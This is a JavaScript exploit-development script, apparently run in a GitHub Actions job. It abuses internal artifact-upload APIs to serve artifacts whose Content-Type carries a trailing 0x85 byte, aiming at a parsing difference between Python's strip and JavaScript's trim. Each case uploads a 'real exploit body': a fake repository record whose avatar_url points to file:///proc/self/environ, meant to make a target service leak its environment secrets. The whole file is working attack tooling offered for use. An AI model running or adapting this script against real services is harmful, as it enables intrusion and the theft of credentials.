// Repo Cassette carrier matrix v2 (0x85-only; 1c-1f proven dead at Node HTTP layer).
// Decisive question: can an artifact /zip download serve Content-Type bytes
//   "application/json" + single 0x85   (Python .strip() -> application/json [postcard OK];
//    JS .trim() keeps 0x85 -> != application/json [app branch b, non-null sha]).
// Served CT = rsct param on the Azure SAS URL (= URL-encoded CreateArtifact.mimeType),
// UNLESS rsct is absent, in which case Azure serves the blob's own x-ms-blob-content-type.
// Levers:
//   A : control byte in CreateArtifact.mimeType (protobuf is UTF-8 -> U+0085 becomes C2 85; expect Python-break)
//   B : CreateArtifact.mimeType clean/empty/omitted; single-byte 0x85 in blob content-type (we control raw PUT bytes)
// Each case uploads the SAME real exploit body so a winner is immediately usable.
import {createHash} from 'node:crypto';
import https from 'node:https';

const WS = process.env.GITHUB_WORKSPACE || process.cwd();
const base = `${WS}/node_modules/@actions/artifact/lib`;
const {getBackendIdsFromToken} = await import(`${base}/internal/shared/util.js`);
const {internalArtifactTwirpClient} = await import(`${base}/internal/shared/artifact-twirp-client.js`);
const {StringValue} = await import(`${base}/generated/index.js`);

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 2});
const repo = process.env.GITHUB_REPOSITORY;
const stamp = process.env.GITHUB_RUN_ID;
const sha = b => createHash('sha256').update(b).digest('hex');

const BODY = Buffer.from(JSON.stringify({
  full_name: 'repo-cassette-pwn',
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'repo cassette',
  stargazers_count: 0,
}), 'utf8');

// Raw PUT so we can place a single 0x85 byte in x-ms-blob-content-type without Node string coercion.
// Node accepts 0x85 in an outgoing header value (obs-text); we pass it as a latin1 string.
const req = (url, method = 'GET', body = null, headers = {}) => new Promise((res, rej) => {
  const u = new URL(url);
  const r = https.request(u, {method, headers, timeout: 25000}, resp => {
    const c = [];
    resp.on('data', d => c.push(d));
    resp.on('end', () => res({status: resp.statusCode, headers: resp.headers, raw: resp.rawHeaders, body: Buffer.concat(c)}));
  });
  r.on('error', rej);
  r.on('timeout', () => r.destroy(new Error('timeout')));
  if (body) r.write(body);
  r.end();
});
const ctHex = r => {
  const out = [];
  for (let i = 0; i < r.raw.length; i += 2)
    if (r.raw[i].toLowerCase() === 'content-type') out.push(Buffer.from(r.raw[i + 1], 'latin1').toString('hex'));
  return out;
};

// createMime: string | null(omit field);  blobCt: latin1 string | null(don't set header)
async function run(label, createMime, blobCt) {
  const name = `rc-x-${label}-${stamp}`;
  const out = {
    label, name,
    createMimeHex: createMime == null ? null : Buffer.from(createMime, 'latin1').toString('hex'),
    blobCtHex: blobCt == null ? null : Buffer.from(blobCt, 'latin1').toString('hex'),
    bodySha: sha(BODY),
  };
  try {
    const createReq = {...ids, name, version: 7};
    if (createMime != null) createReq.mimeType = StringValue.create({value: createMime});
    const created = await client.CreateArtifact(createReq);
    out.createOk = !!created.ok;
    if (!created.ok) throw new Error('CreateArtifact ok=false');
    const up = created.signedUploadUrl;
    const hdrs = {'x-ms-blob-type': 'BlockBlob', 'Content-Length': String(BODY.length)};
    if (blobCt != null) hdrs['x-ms-blob-content-type'] = Buffer.from(blobCt, 'latin1').toString('latin1');
    out.put = (await req(up, 'PUT', BODY, hdrs)).status;
    const fin = await client.FinalizeArtifact({...ids, name, size: String(BODY.length), hash: StringValue.create({value: `sha256:${sha(BODY)}`})});
    out.finalizeOk = !!fin.ok;
    if (!fin.ok) throw new Error('FinalizeArtifact ok=false');
    out.artifactId = String(fin.artifactId);
    const api = await req(`https://api.github.com/repos/${repo}/actions/artifacts/${out.artifactId}/zip`, 'GET', null, {
      Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
      Accept: 'application/vnd.github.v3+json',
      'User-Agent': 'rc-matrix2',
    });
    out.restStatus = api.status;
    if (api.status === 302 && api.headers.location) {
      const loc = api.headers.location;
      out.hasRsct = /[?&]rsct=/.test(loc);
      const m = /[?&]rsct=([^&]*)/.exec(loc);
      out.rsctDecodedHex = m ? Buffer.from(decodeURIComponent(m[1]), 'latin1').toString('hex') : null;
      const final = await req(new URL(loc).href);   // Node parses the served Content-Type (0x85 survives; 1x throws)
      out.finalStatus = final.status;
      out.finalCtHex = ctHex(final);                  // ground-truth served Content-Type bytes
      out.bodyMatch = final.body.equals(BODY);
    }
  } catch (e) {
    out.error = String(e.message || e).slice(0, 200).replace(/https?:\/\/\S+/g, '[url]');
  }
  console.log('RCX ' + JSON.stringify(out));
}

const J85 = 'application/json\u0085';   // latin1 -> bytes 6170...6e 85 (single trailing 0x85)
const MARK = 'application/x-rc-mark';
// Lever A: 0x85 in CreateArtifact.mimeType (protobuf UTF-8 -> likely C2 85, Python-breaking; capture truth)
await run('A-85', J85, MARK);
// Baseline: does GitHub always add rsct, and does it equal the mimeType?
await run('base-clean', 'application/json', MARK);
// Lever B: single-byte 0x85 in blob content-type, with mimeType clean / empty / omitted to try to suppress rsct
await run('B-85-clean', 'application/json', J85);
await run('B-85-empty', '', J85);
await run('B-85-omit', null, J85);
console.log('RCX DONE');
